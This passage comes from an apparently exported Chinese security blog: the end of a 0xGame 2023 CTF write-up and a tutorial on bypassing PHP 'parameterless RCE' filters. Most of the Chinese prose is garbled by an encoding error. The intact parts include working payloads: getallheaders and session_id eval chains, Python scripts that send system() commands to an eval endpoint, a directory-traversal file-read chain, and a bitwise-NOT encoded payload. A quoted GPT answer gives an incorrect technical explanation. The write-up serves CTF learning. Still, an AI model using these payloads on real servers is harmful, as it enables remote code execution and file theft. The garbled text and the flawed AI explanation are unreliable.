å¦‚ä¸Šå›¾ï¼Œè¯æ˜å‘é€æˆåŠŸ ![image-20231105164923715](0xGame 2023/image-20231105164923715.png) æœ€ååœ¨envä¸­å¯ä»¥çœ‹åˆ°flag ![image-20231105164747944](0xGame 2023/image-20231105164747944.png) 0x02 åè®° ç»ˆäºå¤ç°å®Œäº†ï¼Œè™½ç„¶æ„Ÿè§‰åšé¢˜ä½“éªŒæ„Ÿä¸å¥½ï¼Œä½†å‡ºçš„é¢˜çœŸçš„æœ‰æ°´å¹³å•Šï¼ˆå› ä¸ºå…¨ä¸ä¼šï¼Œæ–°ç”Ÿèµ›å°±è¿™ä¹ˆé«˜å¼ºåº¦ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ æ€»çš„æ¥è¯´ï¼Œå¾ˆå¤šçŸ¥è¯†ç‚¹éƒ½æ²¡è§è¿‡ï¼Œå°±è¿™å››å‘¨çš„çŸ¥è¯†ç‚¹å°±å¤Ÿæˆ‘å­¦ä¸€é˜µå„¿äº†ï¼ŒåŒæ—¶æˆ‘ä¾æ—§å›°æƒ‘äºå¦‚ä½•å»å­¦ä¹ æé«˜ä»£ç æ°´å¹³ï¼Œæ„Ÿè§‰ç›®å‰çš„è‡ªå·±å°±æ˜¯expä¸ä¼šï¼Œè„šæœ¬ä¸ä¼šï¼Œå®¡è®¡ä»£ç ä¹Ÿå¾ˆæœ‰éš¾åº¦ã€‚çœŸçš„å…¨æ˜¯bugâ”­â”®ï¹â”­â”®ï¼Œæ„Ÿè§‰ä¼¼ä¹è¦è®¤çœŸåœ°é‡æ–°å­¦å­¦ä»£ç äº† 0x03 å‚è€ƒæ–‡ç«  0xGame 2023 Web Official Writeup --å®˜æ–¹wp php is_numericå‡½æ•°çš„ç»•è¿‡ å¸¸è§phpå‡½æ•°ç»•è¿‡ [CTF]php is_numericä¸å¼±ç­‰äº(==)ç»•è¿‡ å¸¸è§çš„Webæºç æ³„æ¼æ¼æ´ Springbootä¹‹actuatoré…ç½®ä¸å½“çš„æ¼æ´åˆ©ç”¨ Spring Boot Actuator æ¼æ´åˆ©ç”¨ Spring Boot Actuator æœªæˆæƒçš„æµ‹è¯•ä¸åˆ©ç”¨æ€è·¯ Javaå®‰å…¨ä¹‹JDBC Attacks Java JDBC","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"phpæ— å‚æ•°RCE","path":"/2023/10/16/php-wu-can-shu-rce/","content":"0x01 å‰è¨€ æœ¬æ–‡æ˜¯åœ¨åšCTFæ¯”èµ›çš„æ—¶å€™é‡åˆ°äº†æ— å‚æ•°çš„RCEï¼Œä¹‹å‰ä¹Ÿæ²¡é‡è§è¿‡è¿™ç§çŸ¥è¯†ç‚¹ï¼Œæ•…æ­¤æ¥å­¦ä¹ ä¸€ç•ªã€‚ä¸è¿‡æœå¯»äº†è®¸å¤šæ–‡ç« ï¼Œæ„Ÿè§‰éƒ½æ˜¯æ— å¤´æ— å°¾çš„æœ‰ç‚¹æ··ä¹±ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ˜¯åœ¨ 0x02 æ¦‚è¿° ä¼ ç»Ÿæ„ä¹‰ä¸Šï¼Œå¦‚æœæˆ‘ä»¬æœ‰ eval($_GET['code']); å³ä»£è¡¨æˆ‘ä»¬æ‹¥æœ‰äº†ä¸€å¥è¯æœ¨é©¬ï¼Œå¯ä»¥è¿›è¡Œgetshellï¼Œä¾‹å¦‚ RCEæŒ‡çš„æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒæœåŠ¡å™¨åå°å¯ä»¥æ‰§è¡Œevalç­‰ä»£ç æ‰§è¡Œå‡½æ•°ï¼Œè€Œæ— å‚æ•°RCEæŒ‡çš„æ˜¯ä¼ å‚çš„æ—¶å€™è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬åªèƒ½è®©ä»£ç æ‰§è¡Œå½¢å¦‚a(b(c(d())))çš„ä»£ç  0x03 è¿‡æ»¤åœºæ™¯ &lt;?php if(isset($_GET['var'])){ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { if (!preg_match('/et|dir|na|info|dec|oct|pi|log/i', $_GET['var'])) { eval($_GET['var']); } else { die(\"Sorry!\"); } } else{ show_source(__FILE__); } ?&gt; å…³é”®ä»£ç  if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { if (!preg_match('/et|dir|na|info|dec|oct|pi|log/i', $_GET['var'])) { eval($_GET['var']); } } é¦–å…ˆåˆ†æå¤–å±‚æ­£åˆ™è¡¨è¾¾å¼[^\\W]+\\((?R)?\\) `^`è¡¨ç¤ºå–å `\\W`ä»£è¡¨åŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº[^A-Za-z0-9_] ä¸Šé¢ä¸¤ç‚¹åŠ ä¸€å—ï¼Œä»£è¡¨åŒ¹é…æ‰€æœ‰å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ `+`ä»£è¡¨å­—æ¯æ•°å­—ä¸‹åˆ’çº¿åŒ¹é…è‡³å°‘ä¸€ä¸ª `\\(` `\\)` ä»£è¡¨åŒ¹é…æ‹¬å·æœ¬èº« `(?R)`è¡¨ç¤ºé€’å½’è¡¨è¾¾å¼æœ¬èº« `(?R)?` æœ€åçš„`?`è¡¨ç¤ºåŒ¹é…1ä¸ªæˆ–è€…0ä¸ªè¡¨è¾¾å¼æœ¬èº« ç»¼ä¸Šï¼šè¿™ä¸ªè¡¨è¾¾å¼å…¶å®å°±æ˜¯åŒ¹é…å½¢å¦‚`a(b(c(d())));`çš„å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆå‰é¢çš„å­—ç¬¦ä¸²ä¼šè¢«æ›¿æ¢ä¸º';'ï¼Œäºæ˜¯å¯ä»¥è¿”å›trueè€Œè·³åˆ°ä¸‹ä¸€ä¸ªifè¯­å¥ã€‚ å†…å±‚è¡¨è¾¾å¼et|dir|na|info|dec|oct|pi|log è¾“å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½åŒ…å«etã€dirã€naã€infoã€decã€octã€piã€logå­—ç¬¦ä¸² /iè¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œä¸Šé¢çš„é»‘åå•å­—ç¬¦ä¸²åŠæ—¶å¤§å°å†™ä¹Ÿä¸èƒ½è¿›è¡Œç»•è¿‡ 0x04 ç»•è¿‡æ–¹æ³• &lt;?php if(isset($_GET['var'])){ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { echo \"successful!\"; eval($_GET['var']); } else { die(\"Sorry!\"); } } else{ show_source(__FILE__); } ?&gt; 4.1 getallheaders() è¿™é‡Œå‘¢è¿”å›å€¼æ˜¯æ•°å­—ï¼Œå¤±è´¥è¿”å›false ä»¥ä¸‹çš„æµ‹è¯•ä»£ç æ˜¯ï¼š &lt;?php if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']); } else{ show_source(__FILE__); } ?&gt; apache2ç¯å¢ƒä¸‹ï¼Œå‡½æ•°è¿”å›æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œè¿™ä¸ªæ˜¯apacheçš„å‡½æ•° &lt;?php var_dump(getallheaders()); ?&gt; å¦‚ä¸Šå›¾ï¼Œå…¶è¿”å›çš„æ˜¯ä¸€äº›å¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æŠ“åŒ…æ¥è‡ªå®šä¹‰ä¸€äº›å¤´éƒ¨ä¿¡æ¯ å–å‡ºæˆ‘ä»¬è‡ªå®šä¹‰çš„å¤´éƒ¨ä¿¡æ¯ &lt;?php var_dump(end(getallheaders())); ?&gt; è¿™æ ·ä¸€æ¥ç›¸å½“äºæˆ‘ä»¬å°†http headerä¸­çš„hybcxå˜æˆäº†æˆ‘ä»¬çš„å‚æ•°ï¼Œå¯ç”¨å…¶è¿›è¡Œbypassæ— å‚æ•°å‡½æ•°æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾ è¿™é‡Œåˆé’ˆå¯¹evalçš„é—®é¢˜åšäº†ä¸€æ³¢æ¢è®¨ï¼Œè¿™é‡Œæˆ‘å½“åˆç–‘æƒ‘ä¸ºä½•éè¦åœ¨ä¼ å‚çš„åœ°æ–¹åŠ ä¸Ševalå…ˆæ‰§è¡Œä¸€æ¬¡ï¼Œä»£ç ä¸­ä¸å°±æœ‰evalå—ï¼Œä¸ºä½•è¿™é‡Œéœ€è¦å¥—å¨ƒï¼ˆä½†æ˜¯ä¼ å‚çš„æ—¶å€™æ²¡æœ‰evalå°±ä¸èƒ½æˆåŠŸæ‰§è¡Œphpinfoï¼‰ï¼Œäºæ˜¯è¯¢é—®äº†ä¸€æ³¢GPTï¼Œé¦–å…ˆæˆ‘ä»¬è¦æ¸…æ¥ševalå‡½æ•°çš„å‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„PHPä»£ç ï¼Œå¦‚æœåªæ˜¯ä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²æ—¶ä¼šæŠ¥é”™æ— æ³•æ‰§è¡Œçš„ã€‚ è€Œè¿™é‡Œæˆ‘ä»¬å¦‚æœåªæ˜¯ä¼ å…¥end(getallheaders())ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çš„æ„æ€åªæ˜¯å•çº¯çš„å–å‡ºheaderå¤´ä¿¡æ¯çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ•°ç»„æ“ä½œï¼Œè€Œè¿™ä¸ªï¼Œè€Œæˆ‘ä»¬çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯åªä¼šåŒ¹é…ï¼šæ»¡è¶³å‡½æ•°è°ƒç”¨çš„å‚æ•°å†…å®¹ï¼Œä¹Ÿå°±æ˜¯éœ€è¦å‰é¢æ˜¯ä¸€ä¸ªä»£ç æ‰§è¡Œå‡½æ•°çš„æ„æ€ï¼Œè¿™é‡Œå‘¢å½“ç„¶å°±æ˜¯evalã€‚emmmå¯èƒ½æˆ‘è¯´çš„ä¸æ¸…æ¥šï¼Œè¿™é‡Œé™„ä¸ŠGPTå›ç­”ï¼Œå¯èƒ½ä¼šå¥½äº›ï¼š æˆ‘æ˜ç™½ä½ çš„ç–‘è™‘ã€‚åœ¨PHPä¸­ï¼Œ`end(getallheaders())` ä¸ä¼šè¢«è®¤ä¸ºæ˜¯å‡½æ•°è°ƒç”¨ï¼Œå› ä¸ºè¿™ä¸ªè¡¨è¾¾å¼ä»…è¿”å›`getallheaders()`çš„ç»“æœçš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨å‡½æ•°ã€‚å› æ­¤ï¼Œå®ƒä¸åŒ…å«å‡½æ•°è°ƒç”¨ï¼Œè€Œæ˜¯ä¸€ä¸ªæ•°ç»„æ“ä½œã€‚ åœ¨ä½ çš„ç¤ºä¾‹ä¸­ï¼Œç¡®å®åªä¼ å…¥äº† `end(getallheaders())` è€Œæ²¡æœ‰æ‰§è¡Œï¼Œå› ä¸ºå®ƒä¸æ»¡è¶³æ¡ä»¶æ£€æŸ¥çš„è¦æ±‚ã€‚æˆ‘ä¹‹å‰çš„å›ç­”ä¸­æœ‰ä¸€äº›æ··æ·†ï¼Œæˆ‘ä¸ºæ­¤é“æ­‰ã€‚ä½ çš„æ¡ä»¶æ£€æŸ¥æ˜¯åŸºäºæ­£åˆ™è¡¨è¾¾å¼æ¥æŸ¥æ‰¾åŒ…å«å‡½æ•°è°ƒç”¨çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªæœ‰åŒ…å«å‡½æ•°è°ƒç”¨çš„å­—ç¬¦ä¸²ä¼šæ»¡è¶³æ¡ä»¶ã€‚ å¦‚æœä½ ä¼ å…¥çš„å‚æ•°ä¸­åªåŒ…å« `end(getallheaders())`ï¼Œå®ƒä¸ä¼šè¢«è®¤ä¸ºæ˜¯å‡½æ•°è°ƒç”¨ï¼Œå› æ­¤ä¸ä¼šæ‰§è¡Œ `eval()` ä¸­çš„ä»£ç ã€‚ æ€»ä¹‹ï¼Œä½ çš„ç¤ºä¾‹ä»£ç è¦æ±‚ `$_GET['code']` å‚æ•°ä¸­åŒ…å«æœ‰æ•ˆçš„å‡½æ•°è°ƒç”¨ï¼Œæ‰ä¼šæ‰§è¡Œ `eval($_GET['code'])` ä¸­çš„ä»£ç ã€‚ `end(getallheaders())` ä¸åŒ…å«å‡½æ•°è°ƒç”¨ï¼Œå› æ­¤ä¸æ»¡è¶³è¿™ä¸ªè¦æ±‚ã€‚ å›åˆ°æ­£é¢˜ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥è·å–RCE éapacheä¸­é—´ä»¶-è¿™é‡Œå€Ÿç”¨å…¶ä»–å¸ˆå‚…çš„å›¾äº† 4.2 get_defined_vars() &lt;?php var_dump(get_defined_vars()); ?&gt; å¯ä»¥å›æ˜¾çš„å…¨å±€å˜é‡ $_GET $_POST $_FILES $_COOKIE å°è¯•RCE å¦‚ä¸Šå›¾æˆ‘ä»¬endå–åˆ°æœ€åä¸€ä¸ªå…ƒç´  evalç›´æ¥æ‰§è¡Œ å¦‚æœæœåŠ¡å™¨ å¯¹ $_GET $_POST $_COOKIE è¿›è¡Œäº†å…¨å±€è¿‡æ»¤ï¼Œå¯ä»¥ä» $_FILESä¸‹æ‰‹ import requests from io import BytesIO payload = \"system('calc.exe');\".encode('hex') files = { payload: BytesIO('hybcx') } r = requests.post('http://localhost/eval.php?var=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False) print r.content 4.3 session_id() phpä¸­å¯¹æ­¤å‡½æ•°çš„è§£é‡Š å¯ä»¥è·å–PHPSESSIDçš„å€¼ï¼Œè€Œæˆ‘ä»¬çŸ¥é“PHPSESSIDå…è®¸å­—æ¯å’Œæ•°å­—å‡ºç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†æ–°çš„æ€è·¯ï¼Œå³hex2bin payloadï¼š import requests payload = \"system('calc.exe');\".encode('hex') cookies = { 'PHPSESSID': payload } r = requests.get('http://localhost/eval.php?var=eval(hex2bin(session_id(session_start())));', cookies=cookies) print r.content å³å¯è¾¾æˆRCEå’Œbypassçš„ç›®çš„ 4.4 getenv() æŸ¥é˜…phpæ‰‹å†Œï¼Œæœ‰éå¸¸å¤šçš„è¶…å…¨å±€å˜é‡ $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV æˆ‘ä»¬å¯ä»¥ä½¿ç”¨$_ENVï¼Œå¯¹åº”å‡½æ•°ä¸ºgetenv() è™½ç„¶getenv()å¯è·å–å½“å‰ç¯å¢ƒå˜é‡ï¼Œä½†æˆ‘ä»¬æ€ä¹ˆä»ä¸€ä¸ªåŒå¤§çš„æ•°ç»„ä¸­å–å‡ºæˆ‘ä»¬æŒ‡å®šçš„å€¼æˆäº†é—®é¢˜ è¿™é‡Œå¯ä»¥ä½¿ç”¨æ–¹æ³•ï¼š æ•ˆæœå¦‚ä¸‹ï¼š ä½†æˆ‘ä»¬è¦çš„æ˜¯æ•°ç»„çš„å€¼ï¼Œé‚£ä½¿ç”¨å¦‚ä¸‹å‡½æ•° ä¸¤è€…ç»“åˆä¾¿å¯ä»¥å±•ç¤ºå‡ºå€¼ æˆ‘ä»¬åˆ™å¯ç”¨çˆ†ç ´çš„æ–¹å¼è·å–æ•°ç»„ä¸­ä»»æ„ä½ç½®éœ€è¦çš„å€¼ï¼Œå³ï¼Œå¯ä½¿ç”¨getenv()ï¼Œå¹¶è·å–æŒ‡å®šä½ç½®çš„æ¶æ„å‚æ•° 4.5 ç›®å½•æ“ä½œç›¸å…³ å¯ä»¥ç”¨ç›¸å…³å‡½æ•°è¿›è¡Œç›®å½•éå†&amp;&amp;ä»»æ„æ–‡ä»¶è¯»å– ç›¸å…³å‡½æ•° getcwd()å½“å‰ç›®å½• scandir() ç›®å½•æ‰«æ dirname() ç›®å½•ç©¿è¶Šï¼Œè¿™é‡Œå®é™…ä¸Šå°±æ˜¯è¿”å›åˆ°äº†ä¸Šçº§ç›®å½• chdir() æ›´æ”¹å½“å‰ç›®å½• è¯»å–ä¸Šä¸€å±‚çš„ç‰¹å®šæ–‡ä»¶ è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸï¼Œå…ˆå€Ÿç”¨å…¶ä»–å¸ˆå‚…çš„å›¾ç‰‡äº†ï¼Œæ„Ÿè§‰åŸå› åœ¨äº è¿™é‡Œæ„Ÿè§‰ä¸Šè¿°æœ€åçš„å¤ç°å¾ˆæ¨¡ç³Šä¸æ¸…æ¥šï¼Œè¿™é‡Œåˆæ‰¾äº†å‡ ç¯‡æ–‡ç« æ¥å­¦ä¹  é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨getcwd()è·å–å½“å‰ç›®å½• ?code=var_dump(getcwd()); string(13) \"/var/www/html\" é‚£ä¹ˆæ€ä¹ˆè¿›è¡Œå½“å‰ç›®å½•çš„ç›®å½•éå†å‘¢ï¼Ÿ è¿™é‡Œç”¨scandir()å³å¯ ?code=var_dump(scandir(getcwd())); array(3) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(9) \"index.php\" } é‚£ä¹ˆæ—¢ç„¶ä¸åœ¨è¿™ä¸€å±‚ç›®å½•ï¼Œå¦‚ä½•è¿›è¡Œç›®å½•è·³è½¬å‘¢ï¼Ÿ æˆ‘ä»¬ç”¨dirname()å³å¯ ?code=var_dump(scandir(dirname(getcwd()))); array(4) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(14) \"flag_phpbyp4ss\" [3]=&gt; string(4) \"html\" } é‚£ä¹ˆæ€ä¹ˆæ›´æ”¹æˆ‘ä»¬çš„å½“å‰ç›®å½•å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å‘ç°æœ‰å‡½æ•°å¯ä»¥æ›´æ”¹å½“å‰ç›®å½• chdir ( string $directory ) : bool å°† PHP çš„å½“å‰ç›®å½•æ”¹ä¸º directoryã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåœ¨ dirname(getcwd()) è¿›è¡Œå¦‚ä¸‹è®¾ç½®å³å¯ chdir(dirname(getcwd())) æˆ‘ä»¬å°è¯•è¯»å–/var/www/123 http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); å³å¯è¿›è¡Œæ–‡ä»¶è¯»å– 0x05 ç›¸å…³å‡½æ•°æ€»ç»“ 1. getcwd()ï¼šå–å¾—å½“å‰å·¥ä½œç›®å½•ï¼ŒæˆåŠŸåˆ™è¿”å›å½“å‰å·¥ä½œç›®å½•ï¼Œå¤±è´¥è¿”å› FALSEã€‚ 2. dirname()ï¼šè¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ï¼Œè¿”å› path çš„çˆ¶ç›®å½•ã€‚ å¦‚æœåœ¨ path ä¸­æ²¡æœ‰æ–œçº¿ï¼Œåˆ™è¿”å›ä¸€ä¸ªç‚¹ï¼ˆâ€™.â€˜ï¼‰ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ã€‚å¦åˆ™è¿”å›çš„æ˜¯æŠŠ path ä¸­ç»“å°¾çš„ /componentï¼ˆæœ€åä¸€ä¸ªæ–œçº¿ä»¥åŠåé¢éƒ¨åˆ†ï¼‰å»æ‰ä¹‹åçš„å­—ç¬¦ä¸²(ä¹Ÿå°±æ˜¯ä¸Šçº§ç›®å½•çš„æ–‡ä»¶è·¯å¾„)ã€‚ 3. chdir()ï¼šæ”¹å˜ç›®å½•ï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ 4. scandir()ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚æˆåŠŸåˆ™è¿”å›åŒ…å«æœ‰æ–‡ä»¶åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚å¦‚æœ directory ä¸æ˜¯ä¸ªç›®å½•ï¼Œåˆ™è¿”å›å¸ƒå°”å€¼ FALSE å¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚ 5. array_flip()ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› NULLã€‚ 6. array_rand()ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œarray_rand() è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚ 7. localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯ . 5.1 phpversion() phpversion()è¿”å›phpç‰ˆæœ¬ï¼Œå¦‚7.3.5 floor(phpversion())è¿”å›7 sqrt(floor(phpversion()))è¿”å›2.6457513110646 tan(floor(sqrt(floor(phpversion()))))è¿”å›-2.1850398632615 cosh(tan(floor(sqrt(floor(phpversion())))))è¿”å›4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))è¿”å›45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))è¿”å›46 chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))è¿”å›. var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))æ‰«æå½“å‰ç›®å½• next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))è¿”å›.. floor()ï¼šèˆå»æ³•å–æ•´ï¼Œsqrt()ï¼šå¹³æ–¹æ ¹ï¼Œtan()ï¼šæ­£åˆ‡å€¼ï¼Œcosh()ï¼šåŒæ›²ä½™å¼¦ï¼Œsinh()ï¼šåŒæ›²æ­£å¼¦ï¼Œceil()ï¼šè¿›ä¸€æ³•å–æ•´ 5.2 crypt() chr(ord(hebrevc(crypt(phpversion()))))`è¿”å›`. hebrevc(crypt(arg))å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ ç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯ $(å¤§æ¦‚ç‡) æˆ–è€… .(å°æ¦‚ç‡) ç„¶åé€šè¿‡ord chråªå–ç¬¬ä¸€ä¸ªå­—ç¬¦ crypt()ï¼šå•å‘å­—ç¬¦ä¸²æ•£åˆ—ï¼Œè¿”å›æ•£åˆ—åçš„å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå°‘äº 13 å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä»è€Œä¿è¯åœ¨å¤±è´¥æ—¶ä¸ç›å€¼åŒºåˆ†å¼€æ¥ã€‚ hebrevc()ï¼šå°†é€»è¾‘é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆlogical-Hebrewï¼‰è½¬æ¢ä¸ºè§†è§‰é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆvisual-Hebrewï¼‰ï¼Œå¹¶ä¸”è½¬æ¢æ¢è¡Œç¬¦ï¼Œè¿”å›è§†è§‰é¡ºåºå­—ç¬¦ä¸²ã€‚ 5.3 æ•°ç»„æ“ä½œ end() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º next() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º prev() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º reset() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º each() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ 5.4 ç›®å½•æ“ä½œ getchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚ scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚ dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚ 0x06 å®æˆ˜æ“ä½œ [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme è¿™é‡Œåœ¨buuctfæ‰“å¼€è®¿é—® ç›´æ¥å…ˆdirsearchæ‰«ä¸€æ³¢ç›®å½•ï¼Œè¿™é‡Œæ‰«å‡ºä¸€ä¸ªswpæ³„éœ²ï¼Œè®¿é—®/.index.php.swpè®¿é—®å¾—åˆ°ï¼Œä¸è¿‡æ‰“å¼€æ–‡ä»¶ä¹‹åå‘ç°ä¹±ç ï¼Œè¿™é‡Œç”¨vimè¿˜åŸä¸€ä¸‹ï¼Œå‘ç°å¦‚ä¸‹ä»£ç  vim -r index.php.swp &lt;?php error_reporting(0); session_start(); //åˆ¤æ–­æ˜¯å¦å­˜åœ¨codeçš„sessionå˜é‡ï¼Œä¸å­˜åœ¨çš„è¯éšæœºç”Ÿæˆ5ä½md5å­—ç¬¦ä¸² if(!isset($_SESSION['code'])){ $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5); } if(isset($_POST['cmd']) and isset($_POST['code'])){ //åˆ¤æ–­postä¼ å…¥çš„codeæ˜¯å¦ä¸ç”Ÿæˆçš„éªŒè¯ç ç›¸åŒ if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){ die('&lt;script&gt;alert(\\'Captcha error~\\');history.back()&lt;/script&gt;'); } $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST['cmd']; //åˆ¤æ–­codeé•¿åº¦ä»¥åŠåˆ©ç”¨æ­£åˆ™åŒ¹é…é™åˆ¶codeä¼ å‚å†…å®¹ï¼Œè¿™é‡Œå‡ ä¹å…¨è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å–åå­—ç¬¦ï¼Œè¿™å·²ç»åœ¨æç¤ºæˆ‘ä»¬äº† if(strlen($code) &gt; 70 or preg_match('/[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm',$code)){ die('&lt;script&gt;alert(\\'Longlone not like you~\\');history.back()&lt;/script&gt;'); //è¿™é‡Œå°±æ˜¯å¸¸è§„çš„æ— å‚RCEé¢˜ç›®çš„æ­£åˆ™è¿‡æ»¤è¡¨è¾¾å¼ }else if(';' === preg_replace('/[^\\s\\(\\)]+?\\((?R)?\\)/', '', $code)){ @eval($code); die(); } } ?&gt; æˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ä¸­ä¸èƒ½æœ‰ä»¥ä¸‹ ï¼Œ /[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ï¼Œ æƒ³åˆ°æ˜¯æ— å­—æ¯æ•°å­—ï¼Œè¿‡æ»¤äº† å¼‚æˆ– å’Œæˆ–ï¼Œç•™äº†å–åï¼ŒåŒæ—¶æˆ‘ä»¬çš„å‡½æ•°å¿…é¡»æ˜¯æ— å‚çš„ã€‚ è¿™é‡Œå…ˆä¸Šä¸€ä¸ªmd5ç¢°æ’ç»•è¿‡éªŒè¯ç çš„è„šæœ¬ import hashlib a=input(\"è¯·è¾“å…¥æ‚¨è¦çˆ†ç ´çš„md5:\") for i in range(1,200000000): x=hashlib.md5(str(i).encode(encoding='UTF-8')).hexdigest() if (x[0:5]==a): print(x) print(i) break æˆ‘ä»¬å…ˆç”¨getallheaderså‡½æ•°çœ‹ä¸€ä¸‹å½“å‰ç¯å¢ƒå˜é‡ï¼Œå½“ç„¶åœ¨è¾“å…¥çš„æ—¶å€™è¦è¿›è¡Œurlç¼–ç å–åï¼Œè¿™é‡Œç¼–ç æ¨èbpè‡ªå¸¦çš„ payloadï¼š åŸå‹ä¸º: var_dump(getallheaders()) cmd=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()); 